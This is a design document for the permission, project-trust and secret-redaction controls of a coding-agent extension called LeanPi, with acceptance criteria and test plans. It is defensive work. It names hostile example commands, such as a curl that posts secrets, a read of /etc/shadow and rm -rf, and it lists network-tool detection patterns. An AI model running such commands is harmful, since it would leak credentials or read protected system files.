# PRD-017 — Permissions & Trust

**Status:** NOT STARTED
**Complexity:** 4 (HIGH)
**Risk override:** Security boundary. The permission engine, the project-trust gate, and secret containment are the controls that decide whether LeanPi executes arbitrary shell, touches the network, spawns subagents, or runs project-supplied executable code. A false pass here means silent unauthorized execution, so the mode is promoted from LOW (score 3) to HIGH and every scope gets a denial proof, not only an allow-path proof.
**Owner:** joao
**Depends on:** PRD-001

## Context

**Covers:** FR-085, FR-147; ROADMAP §15, §47, §48

ROADMAP §47 requires a permissions system with three decisions — `ALLOW`, `ASK`, `DENY` — across the scopes read, edit, shell, network, MCP, external directories, subagents, destructive git operations, and package installs, exposed through `/permissions` (FR-147). ROADMAP §51 FR-085 additionally requires capability-level allow/ask/deny rules, i.e. rules that bind to an individual MCP server or a single MCP tool rather than to the whole `mcp` scope.

ROADMAP §48 adds three security invariants that belong to the same boundary:

1. project-local executable extensions and MCP configurations MUST require explicit trust before they run;
2. secrets SHALL NOT enter LLM context unless explicitly required;
3. subscription credentials SHALL remain owned by their source CLI/provider.

ROADMAP §15 states the executor MUST NOT receive every installed capability by default; this PRD owns the *authorization* half of that (may this capability be invoked at all), while relevance-based disclosure of skills and MCP tools is PRD-005 and PRD-006.

Repository state inspected: the repository is greenfield — `docs/PRDs/v1/ROADMAP.md` is the only file. There is no source tree, no `package.json`, and no existing permission or trust code. Every path named below is created by this PRD's phases or by a dependency PRD, as marked. The technical baseline (TypeScript on Node, Pi extension, `npm run build` / `npm run typecheck` / `npm test` with vitest / `npm run lint`, `src/core/config.ts` and `src/core/types.ts`) is established by PRD-001.

Not in scope here: JEV privacy modes (`enabled | disabled | metadata-only | redacted`) from ROADMAP §48, which are PRD-002; MCP relevance routing and `/mcp`, which are PRD-006; vendor authentication mechanics for external-harness backends, which are PRD-008. PRD-006 and PRD-008 are *consumers* of the rule engine and the environment allowlist this PRD provides.

## Solution

### Approach: one chokepoint, one rule list

The cheapest correct design for a security boundary is a single interception point, because a per-callsite guard is a boundary with as many holes as it has callsites. LeanPi installs one permission guard on Pi's tool-dispatch hook during extension activation. Every tool call — built-in read/edit/shell, MCP tool invocation from PRD-006's router, subagent spawn from PRD-007's executor — travels through Pi's dispatch and therefore through the guard, with no cooperation required from the callers. New capability types added by later PRDs are covered by construction.

Rules are a flat, ordered list in `LeanPiConfig` (PRD-001), not a class hierarchy:

```yaml
permissions:
  defaults:
    read: allow
    edit: ask
    shell: ask
    network: ask
    mcp: ask
    external_dir: deny
    subagent: ask
    git_destructive: deny
    package_install: ask
  rules:
    - { capability: "shell:git push --force*", decision: deny }
    - { capability: "mcp:fs/read_file",        decision: allow }
    - { capability: "mcp:fs/write_file",       decision: deny }
```

A capability id is `<scope>:<target>`; `target` is the MCP `server/tool` pair, the tool name, or the command line, matched with a plain glob. Resolution: most specific matching rule wins (longest literal prefix of the glob), then the scope default, then the built-in default. Built-in defaults are the conservative column above. `ASK` resolves through Pi's existing confirmation prompt; the answer is scoped to the exact capability id, so answering yes for `shell:npm test` never authorizes `shell:rm -rf`. No rule DSL, no policy engine dependency, no per-scope subclass — one glob match and an ordered list cover FR-085's capability-level granularity and §47's scope-level granularity with the same code.

**One call implicates a set of scopes, and must satisfy all of them.** Classification returns a scope *set*, never a single scope: `curl https://example.com -d @secrets` is `{shell, network}`, `npm install evil-pkg` is `{shell, package_install}`, `cat ../../etc/shadow` is `{shell, external_dir}`, `git push --force` is `{shell, git_destructive}`. Each implicated scope is resolved independently to its own `<scope>:<target>` capability id, and the effective decision is the **strictest across the set** (`deny` > `ask` > `allow`); an `ask` set prompts once, naming every scope it covers. Without this, `shell: allow` would silently grant network egress, package installs and out-of-root reads, and the `external_dir: deny` built-in default would be unreachable through the most common tool — the exact bypass the single-chokepoint design exists to prevent. The set is produced by the same classification table, so adding a scope row costs one line and no new enforcement site.

`/permissions` reads and writes that list: bare `/permissions` prints every scope and rule with its effective decision and the config file it came from, `/permissions set <capability> <allow|ask|deny>` writes a rule to user scope, and `/permissions trust <path>` grants project trust (below).

### Trust gate

Project-local configuration is untrusted input. `src/core/config.ts` (PRD-001) loads user scope and project scope; this PRD inserts `assertTrusted()` between load and use. Until the project's trust record exists, project-supplied executable extensions are not loaded and project-supplied MCP servers are not connected. Trust is keyed to the SHA-256 of the project's `.leanpi/` executable and MCP configuration surface, so editing a trusted config revokes trust until re-granted — this is what stops a trusted-once repository from later self-escalating.

Critically, **project scope cannot loosen permissions**. Merge is asymmetric: a project rule may make an effective decision stricter (toward `DENY`) but never looser. A project config asking for `shell: allow` is recorded as ignored and reported by `/permissions`, which removes the obvious bypass — a repository that grants itself the permissions it wants.

### Secret containment

Two mechanical rules, both applied inside the guard:

- **Into context:** values of environment variables whose names match the secret-name pattern (`*_TOKEN`, `*_KEY`, `*_SECRET`, `*PASSWORD*`, `*CREDENTIAL*`), plus values loaded from configured secret sources, are replaced with `«redacted:NAME»` in tool output before that output reaches the executor or PRD-014's artifact store. Redaction is by value, not by call site, so a secret echoed by an unrelated command is still caught.
- **Out to children:** processes LeanPi spawns receive an allowlisted environment (`PATH`, `HOME`, `LANG`, locale, plus explicitly configured passthrough names), never the parent's full environment. This is also the mechanism that keeps subscription credentials owned by their source CLI (§48): LeanPi never reads, copies, or forwards a vendor credential file or token; a vendor CLI authenticates itself from its own configuration, which it reaches because it runs as the user, not because LeanPi handed it a token.

### Consumer flow

```
user types /permissions set shell deny
        → src/commands/permissions.ts
        → rule written to user-scope LeanPiConfig
user asks the session to run a build
        → Pi tool dispatch
        → src/permissions/guard.ts  → resolve("shell:npm run build") = deny
        → tool call refused, refusal text names the scope, no child process spawned
```

### Risks

- **Bypass by a caller that does not route through Pi dispatch.** Mitigated by design (single chokepoint) and verified by a bypass control: with the guard registration removed, the denial ACs must fail. If they still pass, the assertions prove nothing.
- **Redaction misses a secret shape.** Accepted ceiling: value-based redaction over a name-matched set plus configured sources. It cannot catch a secret LeanPi never saw as a value. Recorded in the implementation as a `ponytail:` note with the upgrade path (entropy-based scanning) rather than built speculatively now.
- **Trust hash churn.** A formatting-only edit to project config revokes trust. Accepted: re-granting is one command, and content-hash trust is what blocks post-trust escalation.

### Non-goals (ROADMAP §58)

No blanket capability exposure — nothing becomes reachable by default. No unbounded autonomy — `ASK` and `DENY` remain the defaults for destructive scopes, and no phase here grants an agent broader reach than the user's configuration. No vendor-limit bypass — credentials stay with their owning CLI and LeanPi never re-uses or relays them. No correctness claims without evidence — every denial in this PRD is asserted by an observation that a side effect did *not* happen (zero spawns, absent marker file, absent token), not by a success envelope.

### Lanes

Every AC is `local; actor: agent`. No shared CI job and no owner gate is required or included: each security property is observable in a local session with a fixture project and a spawn/fs spy, so there is nothing here whose proof depends on a human credential, subscription, or device.

## External Skill Dependencies

LeanPi consumes the user's already-installed skills and plugins; it does not reimplement them. This PRD does not *load* skills — that is PRD-005's registry — but it owns the trust boundary those roots sit on, so it must classify each root. Verified paths on this machine are the **discovery defaults**, never hard-coded absolutes in product code: the roots list lives in `LeanPiConfig.capabilities.skillRoots` (PRD-001) with the defaults below, and the trust classifier keys on root *kind*, not on any literal path.

| Root | Verified path | Trust classification |
|---|---|---|
| User global (Claude) | `/home/joao/.claude/skills` (26 skills) | User scope — installed by the user, trusted without a gate |
| User global (Codex) | `/home/joao/.codex/skills` (196 skills) | User scope — trusted without a gate |
| Plugin-provided | `/home/joao/.claude/plugins/cache/*/*/<version>/skills/` | User scope — trusted at the pinned version the user installed |
| Ponytail instruction bundle | `/home/joao/.claude/plugins/cache/ponytail/ponytail/4.9.0/skills/ponytail/SKILL.md` (siblings `ponytail-review`, `ponytail-audit`, `ponytail-debt`) | User scope; vendored at a pinned version by PRD-001 (FR-002), not by this PRD |
| Authoring contract | `/home/joao/.claude/skills/prd-creator/SKILL.md` (mirror `/home/joao/.codex/skills/prd-creator/`) | User scope; consumed by PRD-012's adapter, not at runtime here |
| Project-local | `<project>/.claude/skills`, `<project>/.codex/skills` (from `LeanPiConfig.capabilities.skillRoots`), `<project>/.leanpi/mcp.json` (from `LeanPiConfig.capabilities.mcpConfigPaths`, project scope), `<project>/.leanpi/extensions` | **Untrusted input** — gated by this PRD's trust gate before anything executable in them runs |

The rule is one line: a root the user installed is trusted because the user installed it; a root that arrives with a cloned repository is not. Precedence for *resolution* (project > user global > plugin) is PRD-005's; precedence never overrides trust, so a project-local skill that shadows a global one still cannot execute before the gate opens.

## JEV Decision Sites

| Decision | Atomic question(s) | Return type | Deterministic fallback when JEV off | Value rating |
|---|---|---|---|---|
| None | — | — | — | — |

None — this PRD owns no JEV decision site and registers none in PRD-002's decision-site registry. Authorization is a security boundary: an allow/ask/deny outcome MUST be a deterministic function of configuration, never a model judgement, so there is no site here to make probabilistic. Capability *relevance* decisions that precede authorization are owned by PRD-005 (skill disclosure) and PRD-006 (MCP disclosure); this engine runs after them and can only narrow their result.

## Acceptance Criteria

- [ ] AC-1 [local; actor: agent]: Bare `/permissions` in a session prints all nine scopes with their effective decision and originating config source; after `/permissions set shell deny`, a second `/permissions` shows `shell: deny` attributed to user scope — Evidence: pending.
- [ ] AC-2 [local; actor: agent]: With `shell: deny` in effect, a session request that triggers a shell tool call returns a refusal naming the `shell` scope and the requested capability, and the process-spawn spy records zero spawns for that turn — Evidence: pending.
- [ ] AC-3 [local; actor: agent]: With `shell: ask`, answering the confirmation prompt "no" leaves the command unexecuted (zero spawns) while answering "yes" executes it exactly once; a subsequent differing command re-prompts rather than reusing the prior approval — Evidence: pending.
- [ ] AC-4 [local; actor: agent]: With capability rules `mcp:fs/write_file: deny` and `mcp:fs/read_file: allow` under a `mcp` scope default of `ask`, invoking `fs/read_file` through the session succeeds without a prompt while `fs/write_file` is refused, the target file is unchanged on disk, and zero bytes are written to the server's stdin for the refused call — Evidence: pending.
- [ ] AC-5 [local; actor: agent]: With `subagent: deny`, a session request that would spawn a subagent is refused and no child session is created (session registry count unchanged); with `git_destructive: deny`, `git push --force` is refused while `git status` still runs — Evidence: pending.
- [ ] AC-6 [local; actor: agent]: Opening a session in a fixture project containing an untrusted `.leanpi/extensions/hook.js` (which writes a marker file), an untrusted `.leanpi/mcp.json` server, and an untrusted project-local `.claude/skills/evil/` entry starts none of them: neither marker file exists; the project's `.leanpi/mcp.json` server declaration is absent from the trusted config `assertTrusted()` returns and the fixture's stub spawn hook records zero spawns; the project-local skill root is absent from `LeanPiConfig.capabilities.skillRoots` after `loadConfig`; and `/permissions` lists the project as untrusted — while the configured user-global skill roots survive the same load — Evidence: pending.
- [ ] AC-7 [local; actor: agent]: An untrusted project config declaring `permissions.defaults.shell: allow` and its own `trust: true` does not change behavior: `/permissions` still reports the user-scope decision for `shell`, flags the project's self-grant as ignored, and a shell request under a user-scope `deny` is still refused — Evidence: pending.
- [ ] AC-8 [local; actor: agent]: After `/permissions trust project`, re-opening the same session runs the project extension exactly once (marker file present, single write) and the project `.leanpi/mcp.json` server declaration is present in the trusted config `assertTrusted()` returns; editing `.leanpi/mcp.json` afterwards returns the project to untrusted on the next open, the edited declaration is absent from the trusted config again, and the stub spawn hook records zero spawns for it — Evidence: pending.
- [ ] AC-9 [local; actor: agent]: A shell tool call whose output contains the value of a seeded `TEST_API_TOKEN` yields executor-visible output in which the token value is absent and replaced by `«redacted:TEST_API_TOKEN»`, while the surrounding non-secret output is preserved verbatim; the same redaction holds for the stored artifact — Evidence: pending.
- [ ] AC-10 [local; actor: agent]: A process spawned by an allowed shell tool call observes an environment containing `PATH` and configured passthrough names but not the parent's seeded `ANTHROPIC_API_KEY` or `TEST_API_TOKEN` (child prints its own environment; secrets absent) — Evidence: pending.
- [ ] AC-11 [local; actor: agent]: With `edit: deny`, a session request that triggers an edit tool call on a fixture file returns a refusal naming the `edit` scope and the file's bytes and mtime are unchanged on disk; with `edit: allow` the same request rewrites it, so the assertion is sensitive to the guard and not to a broken edit path — Evidence: pending.
- [ ] AC-12 [local; actor: agent]: With `read: deny`, a session request that triggers a read tool call returns a refusal naming the `read` scope and an `fs` open spy records zero opens of the target path; under the `read: allow` default the same request returns the file contents — Evidence: pending.
- [ ] AC-13 [local; actor: agent]: With `network: deny` **and `shell: allow`**, a shell-issued `curl http://127.0.0.1:<fixture-port>/` is refused naming the `network` scope, the socket spy records zero outbound connections and the fixture HTTP server logs zero requests, while `shell:echo ok` under the same configuration still runs — proving the strictest-scope rule and that `shell: allow` cannot buy network access — Evidence: pending.
- [ ] AC-14 [local; actor: agent]: With the built-in `external_dir: deny` default and `shell: allow`, a read of a path resolving outside the session root (`../outside/secret.txt`, symlink included) is refused naming the `external_dir` scope and the `fs` open spy records zero opens of it, while the same read of a path inside the session root succeeds — Evidence: pending.
- [ ] AC-15 [local; actor: agent]: With `package_install: deny` and `shell: allow`, `npm install <pkg>` is refused naming the `package_install` scope with zero spawns recorded and `node_modules` unchanged, while `npm test` in the same session spawns and runs — Evidence: pending.

## Integration Ledger

| Capability | Reachable consumer/trigger | Replaces / disposition | Evidence |
|---|---|---|---|
| Permission enforcement on every tool call | LeanPi session → Pi tool-dispatch hook installed by `installPermissionGuard` in `src/permissions/guard.ts` (created in Phase 1), registered from the extension activation in `src/core/extension.ts` (PRD-001) | New control; replaces Pi's unguarded dispatch for LeanPi sessions. Sole enforcement point — no per-callsite guards are added by PRD-006/007/008, and every scope a call implicates is resolved at this one hook | AC-2, AC-4, AC-5, AC-11, AC-12, AC-13, AC-14, AC-15 |
| `/permissions` inspection and control | Session slash command `permissionsCommand` in `src/commands/permissions.ts` (created in Phase 1) | New surface (FR-147) | AC-1, AC-3 |
| Project trust gate | LeanPi config load → `assertTrusted` in `src/permissions/trust.ts` (created in Phase 2), called by `loadConfig` in `src/core/config.ts` (PRD-001) before any project extension, project MCP server, or project-local skill entry is registered with PRD-005/PRD-006's registries | Replaces trust-by-default for project-local config; project scope becomes deny-only in the merge. Sole trust check — PRD-005 and PRD-006 add none | AC-6, AC-7, AC-8 |
| Secret containment | Guard output path → `redactSecrets`, and spawn path → `childEnv`, both in `src/permissions/secrets.ts` (created in Phase 3); `childEnv` is the launch-environment source consumed by PRD-008's external-harness workers | New invariants (ROADMAP §48) | AC-9, AC-10 |

## Execution Phases

#### Phase 1: Permission engine, single guard chokepoint, and `/permissions`
**Status:** NOT STARTED
**ACs:** AC-1, AC-2, AC-3, AC-4, AC-5, AC-11, AC-12, AC-13, AC-14, AC-15
**Files:**
- `src/permissions/rules.ts` (new) — scope enum, `PermissionRule`, `PermissionDecision`, built-in conservative defaults, `classifyScopes(call) -> Scope[]` (the per-scope pattern table, including the network-command and out-of-root-path rows), `resolve(capabilityId, config)` with longest-literal-prefix glob matching, and `resolveAll(capabilityIds, config)` returning the strictest decision across the set.
- `src/permissions/guard.ts` (new) — `installPermissionGuard(session)`: wraps Pi's tool dispatch, builds one capability id per implicated scope, resolves the strictest decision, routes `ask` to Pi's confirmation prompt keyed by exact capability id (one prompt naming every scope it covers), and refuses with a message naming the deciding scope plus capability.
- `src/commands/permissions.ts` (new) — `/permissions`, `/permissions set <capability> <decision>`.
- `src/core/extension.ts` (PRD-001, edited) — call `installPermissionGuard` during activation, before any tool is reachable.
- `src/core/types.ts` (PRD-001, edited) — add `permissions` to `LeanPiConfig`.
- `tests/permissions/engine.spec.ts`, `tests/permissions/guard.spec.ts` (new); `tests/fixtures/permissions/**` (new) — an editable and a readable file inside the session root, a symlink plus a real path outside it, and a loopback HTTP server that logs inbound requests for the `network` scope assertions.

**Implementation:** Classification returns the **set** of scopes a dispatched call implicates, and one `<scope>:<target>` capability id per member — scopes drawn from read / edit / shell / network / mcp / external_dir / subagent / git_destructive / package_install, target from the tool arguments (MCP `server/tool`, command line, or path). The classification table has one row set per scope, all applied to the same call: destructive git (`push --force`, `reset --hard`, `clean -fd`, `branch -D`, `checkout --` with no path guard); package installers (`npm|pnpm|yarn|bun install|add`, `pip install`, `cargo install`, `go install`, `gem install`, `apt|brew install`); network commands (`curl`, `wget`, `nc`, `ssh`, `scp`, `rsync` with a remote target, `git fetch|pull|push|clone|ls-remote`); and out-of-root paths — any argument path whose `realpath` (symlinks resolved) escapes the session root adds `external_dir`. A shell call therefore always carries `shell` plus whatever else its command line implicates; classification is a table, not a parser, and an unrecognised command line is `{shell}` alone. Resolution runs per implicated scope — matching rules by descending literal-prefix length, then scope default, then built-in default — and the call takes the strictest result (`deny` > `ask` > `allow`); the refusal message names the scope that produced the `deny`. `ASK` answers cache per exact capability id for the session only, and a cached `allow` for one scope never satisfies another scope in the set; nothing widens a cached answer. Refusal is a returned tool error, not a thrown exception, so the session reports it and continues.

**Verification:** E1 — `npx vitest run tests/permissions` drives real sessions through the installed guard: asserts the `/permissions` render and mutation (AC-1), zero spawns under `shell: deny` with a `child_process.spawn` spy (AC-2), the ask-no / ask-yes / re-prompt sequence (AC-3), per-tool MCP granularity with an on-disk unchanged-file assertion (AC-4), subagent plus destructive-git denial (AC-5), an unchanged-bytes-and-mtime assertion under `edit: deny` with the `edit: allow` contrast (AC-11), an `fs` open spy at zero under `read: deny` with the allow contrast (AC-12), a socket spy and fixture-server request log both at zero for a shell-issued `curl` under `network: deny` + `shell: allow` while `echo ok` still runs (AC-13), zero opens of a symlinked out-of-root path under the `external_dir: deny` default while the in-root read succeeds (AC-14), and zero spawns for `npm install` under `package_install: deny` + `shell: allow` while `npm test` spawns (AC-15). Every scope-set AC pairs a denial with a permitted sibling, so none can pass on a tool that simply never runs. Tests are written red first; the red must come from the missing guard, not an import error. Bypass control for the "registered but unspawned" risk: with the `installPermissionGuard` call removed from activation, the assertions of AC-2, AC-4, AC-5, AC-11, AC-12, AC-13, AC-14 and AC-15 must all fail — recorded as proof that each observes the real enforcement path rather than a helper.
**Checkpoint:** pending

#### Phase 2: Project trust gate
**Status:** NOT STARTED
**ACs:** AC-6, AC-7, AC-8
**Files:**
- `src/permissions/trust.ts` (new) — `projectSurfaceHash(root)`, `trustState(root)`, `assertTrusted(root)`, `grantTrust(root)`; trust records in user-scope state keyed by absolute project path plus surface hash. The surface is `.leanpi/extensions`, the project-scope entries of `LeanPiConfig.capabilities.mcpConfigPaths` (default `.leanpi/mcp.json`), and the project-local entries of `LeanPiConfig.capabilities.skillRoots` (default `.claude/skills`, `.codex/skills`) — resolved from config, never a literal absolute path.
- `src/core/config.ts` (PRD-001, edited) — call `assertTrusted` before project extensions or MCP servers are registered; apply the asymmetric merge (project rules may only tighten).
- `src/commands/permissions.ts` (edited) — `/permissions trust project`, untrusted-project and ignored-self-grant reporting.
- `tests/fixtures/untrusted-project/` (new) — `.leanpi/extensions/hook.js` writing a marker file, `.leanpi/mcp.json` with a stub stdio server, `.claude/skills/evil/` whose skill body invokes a script writing a second marker, and a project config attempting `shell: allow` and `trust: true`.
- `tests/permissions/trust.spec.ts` (new).

**Implementation:** `assertTrusted` returns the trusted subset of project configuration. Untrusted project executable extensions, MCP server declarations, and project-local skill entries are dropped from the loaded config entirely — not loaded-then-blocked — so there is no code path where they execute; PRD-005's registry therefore receives only trusted project entries and needs no trust logic of its own. User-global and plugin skill roots are not part of the surface: the user installed them, so they carry user-scope trust. Trust grant records `{ root, surfaceHash, grantedAt }`; a hash mismatch on load is treated as untrusted and reported with the changed file. The merge helper rejects any project rule whose effective decision is looser than the resolved user-scope decision, recording it in an `ignoredProjectGrants` list that `/permissions` prints.

**Verification:** E2 — `npx vitest run tests/permissions/trust.spec.ts` opens sessions against the fixture project: asserts marker-file absence and zero MCP spawns before trust (AC-6), that the project's `shell: allow` and `trust: true` are ignored and a shell request under user-scope deny is still refused (AC-7), and the grant → single execution → post-edit revocation sequence (AC-8). AC-8's revocation half is itself the negative control for the trust hash: if trust survived the edit, the assertion that the edited server does not connect fails.
**Checkpoint:** pending

#### Phase 3: Secret containment and vendor credential ownership
**Status:** NOT STARTED
**ACs:** AC-9, AC-10
**Files:**
- `src/permissions/secrets.ts` (new) — `secretValues(env, config)`, `redactSecrets(text, secrets)`, `childEnv(env, config)`.
- `src/permissions/guard.ts` (edited) — redact tool output before it returns to the executor or reaches PRD-014's artifact store; supply `childEnv` as the spawn environment.
- `tests/permissions/secrets.spec.ts` (new).

**Implementation:** `secretValues` collects values for env names matching the secret-name pattern plus configured secret sources, discarding values shorter than a minimum length to avoid redacting trivia. `redactSecrets` does a literal multi-value replacement producing `«redacted:NAME»`. `childEnv` builds a fresh object from the allowlist (`PATH`, `HOME`, `LANG`, `LC_*`, `TERM`, `TMPDIR`, plus configured passthrough names) and never copies the parent environment wholesale, which is what leaves each vendor CLI to authenticate from its own configuration rather than from anything LeanPi forwards. Add a `ponytail:` note recording the accepted ceiling: name-matched value redaction only, upgrade to entropy scanning if a real leak escapes it.

**Verification:** E3 — `npx vitest run tests/permissions/secrets.spec.ts` with a seeded `TEST_API_TOKEN` and `ANTHROPIC_API_KEY` in the harness environment: a session shell call echoing the token yields executor-visible output and a stored artifact with the value absent and the surrounding output byte-identical (AC-9); a session shell call printing its own environment shows `PATH` and configured passthrough names present and both seeded secrets absent (AC-10). The surrounding-output assertion is the control against a vacuous pass from over-redaction; the environment assertion asserts both a presence and an absence so it cannot pass on an empty environment.
**Checkpoint:** pending
